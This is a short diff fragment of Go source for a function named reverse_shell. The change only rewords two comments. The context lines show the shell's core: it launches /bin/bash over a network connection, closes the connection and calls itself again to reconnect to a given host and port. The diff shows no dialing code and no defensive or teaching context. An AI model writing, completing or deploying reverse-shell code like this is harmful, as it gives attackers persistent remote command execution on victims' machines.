@@ -13,7 +13,7 @@ func reverse_shell(host string, port string) {
 		reverse_shell(host, port)
 	}
 
-	// Uses /bin/sh & get
+	// Uses /bin/sh
 	cmd := exec.Command("/bin/bash")
 
 	//Get user instructions
@@ -22,7 +22,7 @@ func reverse_shell(host string, port string) {
 	// Start connection
 	cmd.Run()
 
-	// Then close connection
+	// Close connection
 	connection.Close()
 	reverse_shell(host, port)
 }
